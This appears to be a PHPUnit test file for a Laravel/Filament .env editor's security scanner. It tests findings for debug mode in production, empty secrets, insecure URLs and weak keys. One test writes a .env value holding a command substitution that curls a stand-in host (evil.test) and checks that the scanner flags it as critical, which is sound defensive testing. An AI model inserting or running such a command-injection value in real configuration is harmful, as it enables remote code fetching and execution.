<?php

namespace ArabicSooq\FilamentEnvEditor\Tests\Feature;

use ArabicSooq\FilamentEnvEditor\Security\EnvSecurityChecker;
use ArabicSooq\FilamentEnvEditor\Security\SecurityFinding;
use ArabicSooq\FilamentEnvEditor\Security\SeverityLevel;
use ArabicSooq\FilamentEnvEditor\Tests\TestCase;
use GeoSot\EnvEditor\Facades\EnvEditor;

final class SecurityCheckerTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        // The parent writes a clean sample .env. Point the scanner at a fresh copy
        // that the test can mutate freely.
        EnvEditor::getFileContentManager();
    }

    public function test_clean_env_has_high_score(): void
    {
        $score = app(EnvSecurityChecker::class)->score();

        $findings = app(EnvSecurityChecker::class)->scan();

        // The sample .env has APP_DEBUG=true with no production APP_ENV - it should stay high.
        $this->assertGreaterThanOrEqual(60, $score);
        $this->assertTrue($findings->doesntContain(
            fn (SecurityFinding $finding): bool => SeverityLevel::Critical === $finding->level
        ));
    }

    public function test_debug_enabled_in_production_is_critical(): void
    {
        EnvEditor::editKey('APP_ENV', 'production');
        EnvEditor::editKey('APP_DEBUG', 'true');

        $findings = app(EnvSecurityChecker::class)->scan();

        $debugFindings = $findings->filter(
            fn (SecurityFinding $finding): bool => 'APP_DEBUG' === $finding->key
        );

        $this->assertTrue($debugFindings->contains(
            fn (SecurityFinding $finding): bool => SeverityLevel::Critical === $finding->level
        ));
    }

    public function test_empty_sensitive_key_raises_warning(): void
    {
        EnvEditor::addKey('STRIPE_SECRET', '');

        $findings = app(EnvSecurityChecker::class)->scan();

        $this->assertTrue($findings->contains(
            fn (SecurityFinding $finding): bool => 'STRIPE_SECRET' === $finding->key
                && SeverityLevel::Warning === $finding->level
        ));
    }

    public function test_dangerous_command_value_is_critical(): void
    {
        $envPath = $this->app->environmentFilePath();

        try {
            // An unquoted command substitution would not survive the dotenv parser,
            // so write a quoted one — which produces the same stored value.
            file_put_contents($envPath, 'WEBHOOK_URL="$(curl http://evil.test/x)"'.PHP_EOL);

            $findings = app(EnvSecurityChecker::class)->scan();

            $this->assertTrue($findings->contains(
                fn (SecurityFinding $finding): bool => 'WEBHOOK_URL' === $finding->key
                    && SeverityLevel::Critical === $finding->level
            ));
        } finally {
            // The engine reads the file lazily (app boot in setUp happens before the
            // sample is restored), so always leave a parseable file behind.
            file_put_contents($envPath, $this->sampleEnvContent());
        }
    }

    public function test_insecure_http_url_in_production_is_warning(): void
    {
        EnvEditor::editKey('APP_ENV', 'production');
        EnvEditor::addKey('EXTERNAL_URL', 'http://example.com');

        $findings = app(EnvSecurityChecker::class)->scan();

        $this->assertTrue($findings->contains(
            fn (SecurityFinding $finding): bool => 'EXTERNAL_URL' === $finding->key
                && SeverityLevel::Warning === $finding->level
        ));
    }

    public function test_score_drops_significantly_on_critical_findings(): void
    {
        EnvEditor::editKey('APP_ENV', 'production');
        EnvEditor::editKey('APP_DEBUG', 'true');
        EnvEditor::editKey('APP_KEY', 'some-weak-key');

        $score = app(EnvSecurityChecker::class)->score();

        $this->assertLessThan(60, $score);
    }
}
